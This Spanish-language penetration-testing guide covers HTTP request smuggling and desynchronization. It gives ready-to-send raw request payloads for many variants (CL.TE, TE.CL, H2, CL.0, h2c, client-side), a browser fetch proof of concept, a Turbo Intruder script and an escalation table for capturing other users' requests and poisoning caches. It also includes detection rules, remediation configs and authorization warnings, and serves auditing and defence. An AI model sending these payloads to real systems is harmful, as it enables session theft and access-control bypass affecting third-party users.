# Contrabando de peticiones HTTP y desincronización (HTTP Request Smuggling / Desync)

| Clasificación | |
|---|---|
| CWE | CWE-444 — Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling'); relacionadas: CWE-113 (CRLF en cabeceras, en variantes HTTP/2) |
| OWASP Top 10:2025 | A02 — Security Misconfiguration (mapeo orientativo: discrepancia entre componentes de la cadena HTTP); el impacto suele materializarse como A01/A07 |
| OWASP API Top 10:2023 | API8:2023 — Security Misconfiguration (cuando afecta a gateways de API) |
| WSTG | WSTG-INPV-15 (Testing for HTTP Splitting Smuggling) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura (temporizaciones y respuestas diferenciales) · 4. Explotación por variante (CL.TE, TE.CL, TE.TE, H2.CL, H2.TE, CRLF en HTTP/2, h2c, CL.0, 0.CL y Expect, TE.0, discrepancias de *chunks*, desincronización del lado del cliente, basada en pausas) · 5. Evasión y ofuscación · 6. Escalada · 7. Caja blanca y configuración · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

> ⚠️ **Aviso general**: cualquier prueba que deje bytes en una conexión compartida entre *front-end* y *back-end* puede alterar la respuesta de **otro usuario real**. Las sondas de temporización (§3.1) son las de menor riesgo; la confirmación diferencial (§3.2) y toda explotación requieren **confirmación explícita del cliente**, preferiblemente en ventana de bajo tráfico o en un entorno de preproducción con la misma arquitectura.

---

## 1. Qué es y por qué ocurre

Las aplicaciones modernas encadenan varios servidores HTTP: CDN, balanceador, WAF o proxy inverso (**front-end**) y servidor de aplicación (**back-end**). Para ahorrar recursos, el front-end reutiliza la misma conexión TCP/TLS hacia el back-end para peticiones de distintos usuarios (*keep-alive*). Ambos deben coincidir exactamente en **dónde termina cada petición**. En HTTP/1.1 eso se indica de dos formas:

- `Content-Length` (CL): número exacto de bytes del cuerpo.
- `Transfer-Encoding: chunked` (TE): el cuerpo va en trozos (*chunks*), cada uno precedido de su tamaño en hexadecimal; un trozo de tamaño `0` marca el final.

Si un servidor usa una y el otro la otra (o uno ignora una cabecera ofuscada que el otro acepta), quedan bytes "sobrantes" en la conexión que el back-end interpreta como **el inicio de la siguiente petición**. Esa siguiente petición puede ser de otro usuario: el atacante ha **contrabandeado** un prefijo que se antepone a ella. A esto se le llama **desincronización** (*desync*).

Nomenclatura: `X.Y` = el front-end usa X y el back-end usa Y. Variantes:

- **CL.TE / TE.CL / TE.TE**: clásicas de HTTP/1.1 (TE.TE = ambos soportan TE pero uno ignora una versión ofuscada).
- **H2.CL / H2.TE**: el front-end habla HTTP/2 con el cliente y **degrada** (*downgrade*) a HTTP/1.1 hacia el back-end; HTTP/2 delimita el cuerpo por tramas, pero si el front-end copia un `content-length` o `transfer-encoding` engañoso, el back-end lo usa.
- **CL.0**: el back-end ignora `Content-Length` en ciertos endpoints (lo trata como 0).
- **0.CL**: el front-end ignora `Content-Length` y el back-end lo respeta (investigación 2025, explotable con "respuestas tempranas").
- **TE.0**: el front-end usa TE y el back-end ignora el cuerpo.
- **Desincronización del lado del cliente** (*client-side desync*, CSD): el propio **navegador** de la víctima envía la petición que desincroniza su conexión con el servidor.
- **Basada en pausas** (*pause-based*): el servidor da por terminada la petición por tiempo de espera sin cerrar la conexión.

## 2. Dónde buscar (señales del reconocimiento)

- Varias capas: cabeceras `Via`, `X-Cache`, `CF-Ray`, `X-Amz-Cf-Id`, `X-Served-By`, `Server` distinto en errores 400/502 que en respuestas normales, `Age`.
- CDN/proxies: Akamai, Cloudflare, Fastly, CloudFront, Azure Front Door, AWS ALB/ELB, Google Cloud Load Balancer, F5, Citrix, HAProxy, nginx, Envoy, Traefik, Varnish, Apache Traffic Server, Squid.
- Back-ends: Gunicorn, uWSGI, Puma, Node `http`, Tomcat/Jetty/Undertow, Kestrel/IIS, servidores embebidos o caseros.
- **HTTP/2 hacia el cliente pero HTTP/1.1 hacia el back-end** (casi siempre en CDNs): prueba `curl -sI --http2 https://target` y si responde `HTTP/2`, hay degradación probable.
- `Upgrade: h2c` aceptado, WebSockets tras proxies, endpoints que responden sin leer el cuerpo (estáticos, redirecciones, `404` del servidor).

## 3. Detección segura (primeras sondas, no destructivas)

Configura Burp Repeater: desactiva "Update Content-Length" cuando el valor deba ser incorrecto, muestra caracteres no imprimibles (`\r\n`) y usa HTTP/1.1 o HTTP/2 explícitamente según la prueba. Envía las sondas **pocas veces** y espaciadas.

### 3.1 Sondas de temporización (menor riesgo)

**CL.TE**: el front-end (CL) reenvía solo `1\r\nA`; el back-end (TE) espera el siguiente *chunk* → retraso notable (timeout).

```http
POST / HTTP/1.1
Host: target.example
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

**TE.CL**: el front-end (TE) reenvía `0\r\n\r\n` (5 bytes); el back-end (CL=6) espera un byte más → retraso.

```http
POST / HTTP/1.1
Host: target.example
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

Orden: prueba **primero CL.TE**. Si el sistema es CL.TE, la sonda TE.CL deja la `X` en la conexión y puede **envenenar la petición de otro usuario**. Un timeout en ambas sondas puede indicar que el servidor simplemente no acepta la petición: compara con una petición normal y repite.

### 3.2 Confirmación diferencial (⚠️ requiere confirmación explícita del cliente)

Contrabandea un prefijo que provoque un **404 inequívoco** y envía inmediatamente tu propia petición normal por la **misma conexión** (en Burp: grupo de pestañas → "Send group in sequence (single connection)"). Si tu segunda petición recibe el 404, hay desincronización. Repite pocas veces: con tráfico real, otro usuario podría recibir ese 404.

**CL.TE** (Content-Length = 41 bytes exactos del cuerpo):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Transfer-Encoding: chunked

0

GET /corvus404 HTTP/1.1
X-Ignore: X
```

**TE.CL** (Content-Length = 4 → el back-end lee solo `64\r\n`; `0x64` = 100 bytes del *chunk*; termina con `0\r\n\r\n`):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

64
POST /corvus404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

Calcula siempre los tamaños (Burp Inspector muestra la longitud seleccionada); un error de un byte invalida la prueba.

## 4. Explotación por contexto o tecnología

### 4.1 TE.TE: ofuscar `Transfer-Encoding`

Uno de los dos servidores ignora la cabecera ofuscada y cae a `Content-Length`:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[espacio]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
 : chunked
Transfer-Encoding: identity, chunked
Transfer-Encoding: chunked, identity
Transfer-encoding: cow
```

### 4.2 HTTP/2 con degradación: H2.CL y H2.TE

En Burp, usa HTTP/2 y el **Inspector** para añadir cabeceras que HTTP/2 no permitiría en texto.

**H2.CL** (el front-end copia `content-length: 0` hacia HTTP/1.1; el cuerpo real queda como siguiente petición):

```
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
content-length: 0

GET /corvus404 HTTP/1.1
Host: target.example
X-Ignore: X
```

**H2.TE** (HTTP/2 prohíbe `transfer-encoding`, pero algunos front-ends lo reenvían):

```
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
transfer-encoding: chunked

0

GET /corvus404 HTTP/1.1
Host: target.example
X-Ignore: X
```

### 4.3 Inyección CRLF en cabeceras HTTP/2 y *request splitting*

HTTP/2 es binario: `\r\n` dentro de un valor no tiene significado especial, pero al degradar a HTTP/1.1 se convierte en un salto de línea. En el Inspector de Burp, inserta el salto con Shift+Enter:

```
foo: bar\r\nTransfer-Encoding: chunked                     # inyecta TE → H2.TE aunque se filtre la cabecera directa
foo: bar\r\n\r\nGET /corvus404 HTTP/1.1\r\nHost: target.example      # divide en dos peticiones (request splitting)
:path: / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nX: x     # CRLF en pseudo-cabecera
:method: GET /corvus404 HTTP/1.1\r\nX: x                    # espacio y CRLF en :method
```

*Request splitting* con un `GET` completo es útil para **envenenar la cola de respuestas** (ver §6): ⚠️ requiere confirmación explícita del cliente.

### 4.4 h2c: actualización a HTTP/2 en claro

Si el proxy reenvía la cabecera `Upgrade: h2c` al back-end y luego actúa como túnel, el atacante habla HTTP/2 directamente con el back-end, saltándose reglas del proxy (rutas bloqueadas, autenticación en el borde):

```http
GET / HTTP/1.1
Host: target.example
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

```bash
# h2csmuggler (BishopFox): comprobar y pedir una ruta interna por el túnel
python3 h2csmuggler.py -x https://target.example/ --test
python3 h2csmuggler.py -x https://target.example/ http://localhost/admin
```

### 4.5 CL.0

Algunos back-ends no leen el cuerpo en ciertos endpoints (ficheros estáticos, redirecciones, rutas que responden antes de leer) aunque haya `Content-Length`. El cuerpo queda como siguiente petición:

```http
POST /resources/images/logo.svg HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 36

GET /corvus404 HTTP/1.1
X-Ignore: X
```

Envía en grupo por una sola conexión seguido de `GET / HTTP/1.1`. Si este último devuelve 404, hay CL.0. Prueba también variantes de la cabecera (`Content-Length : 36`, `Content-Length:\t36`) por si solo el front-end la reconoce.

### 4.6 0.CL, `Expect` y discrepancias de visibilidad de cabeceras (investigación 2025)

La investigación "HTTP/1.1 must die" (James Kettle, PortSwigger, 2025) amplió el catálogo:

- **0.CL**: el front-end no ve el `Content-Length` (p. ej. por ofuscación) y el back-end sí. Normalmente produce un bloqueo mutuo (*deadlock*), pero se vuelve explotable si el back-end tiene un **gadget de respuesta temprana**: un endpoint que responde antes de leer el cuerpo (nombres reservados de Windows como `/con` en IIS, redirecciones, ficheros estáticos).
- **Desincronizaciones con `Expect: 100-continue`**: el flujo de respuesta provisional `100 Continue` y sus variantes ofuscadas (`Expect: y 100-continue`, `Expect:\n100-continue`) hacen que front-end y back-end discrepen sobre si hay cuerpo.
- **Discrepancias V-H / H-V** (*visible-hidden*): se detectan cabeceras que un servidor "ve" y el otro "oculta" (p. ej. `Host` o `Content-Length` con espacios o caracteres extraños) y se razona qué combinación produce desincronización.

Detecta estas variantes con la versión actual de **HTTP Request Smuggler** (escaneo de discrepancias de parser) y confirma manualmente con el patrón diferencial de §3.2.

### 4.7 TE.0 y discrepancias en *chunks*

- **TE.0** (2024): el front-end respeta `Transfer-Encoding` y el back-end ignora el cuerpo en ciertos métodos o rutas (p. ej. `OPTIONS`), de modo que los *chunks* se convierten en la siguiente petición. Se demostró en balanceadores cloud ampliamente usados.
- **Extensiones y terminadores de *chunk*** (investigación "funky chunks", 2025): el formato permite extensiones (`1;nombre=valor\r\n`) y algunos parsers aceptan solo `\n` como fin de línea o ignoran bytes tras el tamaño. Si un servidor trata `2;\nxx` como tamaño+datos y el otro como línea inválida, los límites divergen. Prueba de formato válido:

  ```
  2;corvus=1
  xx
  0

  ```

### 4.8 Desincronización del lado del cliente (CSD)

Requisitos: un endpoint que **ignora `Content-Length`** y mantiene la conexión abierta (como CL.0, pero alcanzable por el navegador sin cabeceras prohibidas) y que el servidor no use HTTP/2 hacia el navegador. El navegador de la víctima envía el cuerpo como prefijo y su siguiente petición al sitio lo hereda.

```js
// Prueba en tu propio navegador (Chrome, DevTools con columna "Connection ID")
fetch('https://target.example/endpoint-que-ignora-cl', {
  method: 'POST',
  body: 'GET /corvus404 HTTP/1.1\r\nX: Y',   // prefijo contrabandeado
  mode: 'cors',                              // el error CORS dispara el catch sin cerrar la conexión
  credentials: 'include',
}).catch(() => {
  fetch('https://target.example/', { mode: 'no-cors', credentials: 'include' });
});
// Si la segunda petición (misma Connection ID) devuelve 404 → CSD confirmada
```

Impacto: XSS o robo de datos reutilizando una página que refleja la petición contrabandeada. ⚠️ Cualquier PoC que se envíe a terceros requiere confirmación explícita del cliente; demuéstralo con tu propio navegador.

### 4.9 Desincronización basada en pausas

Algunos servidores responden por tiempo de espera (p. ej. a mitad del cuerpo) sin cerrar la conexión; si el front-end sigue enviando el resto, el back-end lo trata como nueva petición. Con Turbo Intruder, pausa justo antes del prefijo:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1,
                           requestsPerConnection=100, pipeline=False)
    attack = '''POST /recurso-que-redirige HTTP/1.1
Host: target.example
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

GET /corvus404 HTTP/1.1
X-Ignore: X'''
    engine.queue(attack, pauseMarker=['\r\n\r\nGET'], pauseTime=61000)   # pausa > timeout del servidor
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

(Ajusta saltos de línea a `\r\n`; Turbo Intruder lo hace al usar `target.req` como plantilla.)

## 5. Evasión y ofuscación

```
Content-Length: 41
Content-Length: 41                          # duplicada (debe rechazarse; si se acepta, prueba valores distintos)
Content-Length : 41    Content-Length:\t41   Content-Length: +41   Content-Length: 0041   Content-Length: 41,41
Transfer-Encoding: chunked                   # con variantes de §4.1
Transfer-Encoding: \x0bchunked   Transfer-Encoding: chunked\x0b    # tabulación vertical
Transfer\x0bEncoding: chunked                # caracteres extraños en el nombre
Foo: bar\r\n Transfer-Encoding: chunked      # line folding obsoleto (obs-fold)
Content-Length: 41\r\n\r\n  vs  \n\n         # terminadores solo LF
```

- **WAF**: el prefijo contrabandeado no pasa por el WAF del front-end; úsalo para llegar a rutas bloqueadas (ver `vulns/waf-bypass.md`).
- **Cabeceras sobredimensionadas**: si el front-end admite cabeceras más largas que el back-end, este puede truncar y desalinear (CPDoS relacionado: `vulns/cache-poisoning-deception.md`).

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

| Objetivo | Prefijo contrabandeado | Demostración segura |
|---|---|---|
| Saltar controles del front-end | `GET /admin HTTP/1.1\r\nHost: localhost\r\nX-Ignore: X` | Tu propia petición de seguimiento recibe la página restringida; ⚠️ no ejecutes acciones administrativas |
| Descubrir cabeceras internas que añade el front-end | `POST /busqueda HTTP/1.1` con `Content-Length` mayor que el cuerpo y parámetro reflejado al final (`q=`) | Tu segunda petición queda reflejada con las cabeceras internas (`X-Forwarded-For`, `X-SSL-Client-*`, cabeceras de autenticación) |
| Suplantar cabeceras de confianza | Prefijo con `X-Forwarded-For: 127.0.0.1` o cabeceras internas descubiertas | Solo con tu cuenta |
| Capturar peticiones de otros usuarios | `POST /comentario` con `Content-Length` grande y campo final que almacena lo que venga detrás | ⚠️ Captura cookies y datos de usuarios reales: requiere confirmación explícita del cliente; preferir demostrarlo con tu propia segunda sesión |
| XSS reflejado sin interacción (vía cabecera `User-Agent`/`Referer`) | Prefijo que refleja el XSS en la siguiente respuesta | ⚠️ Alcanza a usuarios reales: solo con confirmación explícita |
| Redirección abierta / envenenamiento de caché | Prefijo que obtiene una redirección hacia el dominio del auditor y se cachea | ⚠️ Envenena la caché compartida: requiere confirmación explícita y clave única (ver `vulns/cache-poisoning-deception.md`) |
| Engaño de caché (*cache deception*) | Prefijo hacia una página privada que se cachea en una URL estática | ⚠️ Requiere confirmación explícita |
| Envenenamiento de la cola de respuestas | Petición completa contrabandeada (H2 *splitting*): el front-end entrega respuestas desfasadas | ⚠️ Muy disruptivo (usuarios reciben respuestas ajenas): solo en preproducción o con confirmación explícita |
| Túnel h2c | Petición a rutas internas | Lectura de una ruta interna inocua |

## 7. Caja blanca: fuentes, sumideros y patrones de código

Aquí el "código" es sobre todo **configuración de la cadena** y parsers HTTP propios.

- **Node.js**: `http.createServer({ insecureHTTPParser: true })` o el flag `--insecure-http-parser` aceptan cabeceras inválidas; proxies con `http-proxy`/`http-proxy-middleware` que reenvían `Transfer-Encoding` y `Content-Length` tal cual.
- **Go**: `httputil.ReverseProxy` es robusto; los riesgos aparecen en proxies TCP caseros o al leer peticiones con parsers manuales.
- **Python**: versiones antiguas de Gunicorn, Waitress, uWSGI y Werkzeug tuvieron fallos de TE/CL; revisa versiones fijadas en `requirements.txt`.
- **Java**: Tomcat/Jetty/Undertow antiguos; conectores AJP expuestos (no es smuggling, pero comparte superficie de proxy).
- **Ruby**: Puma antiguo con fallos de parseo de *chunks* y cabeceras.
- **nginx**: `proxy_http_version 1.1` + `keepalive` en `upstream` (reutilización de conexión: condición necesaria para la mayoría de desync), `underscores_in_headers on`, `ignore_invalid_headers off`.
- **Apache**: `HttpProtocolOptions Unsafe` (relaja el parser; lo seguro es `Strict`, por defecto).
- **HAProxy**: versiones antiguas y `option accept-invalid-http-request`.
- **AWS ALB**: atributo `routing.http.desync_mitigation_mode` en `monitor` (lo seguro es `defensive` o `strictest`) y `routing.http.drop_invalid_header_fields.enabled` en `false`.
- Parsers propios: `split("\r\n")`, lectura de `Content-Length` con `parseInt` permisivo, aceptar varias `Content-Length`.

```js
// VULNERABLE: parser permisivo y reenvío de cabeceras de framing
http.createServer({ insecureHTTPParser: true }, handler);

// SEGURO: parser estricto (por defecto) y el proxy recalcula el framing
http.createServer(handler);
```

```nginx
# Más seguro: HTTP/2 o conexión nueva por petición hacia el back-end si el back-end es dudoso
upstream app { server 10.0.0.5:8080; }   # sin "keepalive" → sin reutilización de conexión (coste de rendimiento)
server {
    location / {
        proxy_pass http://app;
        proxy_http_version 1.1;
        proxy_set_header Connection "";
    }
}
```

**Búsqueda con ripgrep**

```bash
rg -n -i 'insecureHTTPParser|insecure-http-parser|accept-invalid-http-request|HttpProtocolOptions\s+Unsafe|underscores_in_headers\s+on|ignore_invalid_headers\s+off' .
rg -n -i 'desync_mitigation_mode|drop_invalid_header_fields' .
rg -n -i 'transfer-encoding|content-length' --glob '!*.lock' --glob '!node_modules/**' .
rg -n --pcre2 '\bkeepalive\s+\d+;|proxy_http_version' -g '*.conf'
rg -n -i 'h2c|Upgrade.*h2c|http2.*cleartext' .
```

**Semgrep**

```yaml
rules:
  - id: corvus-node-insecure-http-parser
    languages: [javascript, typescript]
    severity: ERROR
    message: Parser HTTP permisivo (insecureHTTPParser) habilita desincronizaciones
    pattern-either:
      - pattern: 'http.createServer({..., insecureHTTPParser: true, ...}, ...)'
      - pattern: 'https.createServer({..., insecureHTTPParser: true, ...}, ...)'
      - pattern: 'http.request({..., insecureHTTPParser: true, ...}, ...)'
```

## 8. Falsos positivos frecuentes

- **Timeouts por rechazo**: el servidor no acepta `Transfer-Encoding` en `POST /` o espera más cuerpo por diseño; compara con peticiones de control y con otras rutas.
- **Reutilización de conexión en tu propio cliente**: Burp puede enviar la segunda petición por otra conexión; verifica "single connection".
- **404 por la propia petición**: comprueba que el 404 corresponde al prefijo (`/corvus404`) y no a tu petición de seguimiento.
- **Front-end que cierra la conexión** tras cada petición con cuerpos ambiguos (mitigación activa): no hay desync aunque acepte las cabeceras.
- **Respuestas en cola por *pipelining*** del propio cliente (envío de varias peticiones sin esperar respuesta): no es desincronización del servidor.
- **Resultados de escáneres** que marcan "posible" desync solo por timeouts: exigen confirmación diferencial manual.

## 9. Evidencia mínima para validarlo

- Peticiones exactas en bruto (con `\r\n` visibles o en hexadecimal) y respuestas, indicando HTTP/1.1 o HTTP/2.
- Para temporización: tiempos de la sonda frente a control, repetidos (p. ej. 3/3 con >10 s frente a <300 ms).
- Para confirmación: la respuesta 404 a tu petición de seguimiento por la misma conexión, con el identificador único del prefijo.
- Variante (CL.TE, H2.CL…), componentes implicados si se identifican, y número total de intentos realizados (para valorar posible afectación a terceros).
- Para impacto: demostración con cuentas propias (acceso a ruta restringida, cabeceras internas reveladas).

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario demostrado | CVSS 3.1 | CVSS 4.0 (vector) |
|---|---|---|
| Desincronización confirmada sin impacto adicional demostrado | `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L` (5.6) | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N` |
| Salto de control de acceso del front-end (rutas internas/admin) | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` (8.2) | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N` |
| Captura de peticiones/sesiones de otros usuarios | `AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N` (8.7) | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N` |
| XSS/envenenamiento de caché masivo sin interacción adicional | `AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N` (7.2) | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N` |
| Envenenamiento de cola de respuestas (respuestas ajenas a usuarios) | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (10.0) | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |

`AT:P` (4.0) refleja que la explotación depende de condiciones de despliegue (reutilización de conexión, tráfico de otros usuarios). Calcula la puntuación exacta en la calculadora oficial de FIRST.

## 11. Remediación (con ejemplo de código correcto)

1. **HTTP/2 (o HTTP/3) de extremo a extremo**, incluida la conexión front-end → back-end; evitar la degradación a HTTP/1.1.
2. Si hay HTTP/1.1: el front-end debe **normalizar** (regenerar el *framing* desde cero), rechazar peticiones con `Content-Length` y `Transfer-Encoding` a la vez (o eliminar CL y cerrar la conexión tras la respuesta, como exige RFC 9112 §6.3), rechazar varios `Content-Length`, cabeceras ofuscadas, CRLF en valores HTTP/2, `Transfer-Encoding` distinto de `chunked` y `Upgrade: h2c` desde el cliente.
3. Back-end con parser estricto (`insecureHTTPParser` desactivado, `HttpProtocolOptions Strict`) y versiones actualizadas.
4. Si no se puede garantizar coherencia: **desactivar la reutilización de conexiones** hacia el back-end para rutas sensibles (coste de rendimiento).
5. AWS ALB: `desync_mitigation_mode=strictest` (o `defensive`) y `drop_invalid_header_fields.enabled=true`.
6. Para CSD: servidores que siempre lean o descarten el cuerpo declarado antes de responder (no responder dejando bytes en la conexión), o cerrar la conexión cuando no se lea el cuerpo.
7. Registrar y alertar de peticiones con CL+TE, varias CL o errores 400 de parseo.

```haproxy
# HAProxy: rechazar ambigüedades y no aceptar h2c desde fuera
frontend fe
    bind :443 ssl crt /etc/haproxy/cert.pem alpn h2,http/1.1
    http-request deny if { req.hdr_cnt(content-length) gt 1 }
    http-request deny if { req.hdr_cnt(transfer-encoding) gt 0 } { req.hdr_cnt(content-length) gt 0 }
    http-request deny if { req.hdr(upgrade) -i h2c }
    default_backend be
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso | Cuándo |
|---|---|---|
| Burp Repeater + Inspector | Sondas manuales HTTP/1.1 y HTTP/2, envío en grupo por una conexión | Siempre primero |
| HTTP Request Smuggler (BApp) | Escaneo de CL.TE/TE.CL/H2/CL.0/discrepancias de parser; clic derecho → "Launch smuggle probe" | Tras entender la arquitectura; tiene modo de detección por temporización |
| HTTP Hacker (BApp) | Visualizar conexiones, `\r\n` y reutilización | Análisis de discrepancias |
| Turbo Intruder | Pausas (`pauseMarker`, `pauseTime`), secuencias precisas | Variantes basadas en pausas y confirmación |
| smuggler.py (defparam) | `python3 smuggler.py -u https://target.example/` | Barrido de mutaciones de TE tras confirmar manualmente que el objetivo está en alcance; genera tráfico ambiguo |
| h2csmuggler (BishopFox) | `python3 h2csmuggler.py -x https://target/ --test` | Detectar túneles h2c |
| `curl` | `curl -sv --http2 https://target.example/ -o /dev/null` y `--http1.1` | Comprobar protocolos y ALPN |
| Chrome DevTools | Columna "Connection ID" en Network | Confirmar CSD |

## 13. Referencias

- PortSwigger Web Security Academy — HTTP request smuggling: https://portswigger.net/web-security/request-smuggling
- James Kettle — "HTTP Desync Attacks: Request Smuggling Reborn" (2019): https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- James Kettle — "HTTP/2: The Sequel is Always Worse" (2021): https://portswigger.net/research/http2
- James Kettle — "Browser-Powered Desync Attacks" (2022): https://portswigger.net/research/browser-powered-desync-attacks
- James Kettle — "HTTP/1.1 must die: the desync endgame" (2025): https://portswigger.net/research/http1-must-die
- BishopFox — "h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext" (2020)
- RFC 9112 (HTTP/1.1, §6 *Message Body Length*) y RFC 9113 (HTTP/2, §8.2.2 cabeceras específicas de conexión)
- PayloadsAllTheThings — Request Smuggling; HackTricks — HTTP Request Smuggling (book.hacktricks.wiki)
- OWASP WSTG — WSTG-INPV-15
- CWE-444: https://cwe.mitre.org/data/definitions/444.html
- SnailSploit offensive-checklist (Request Smuggling), licencia MIT
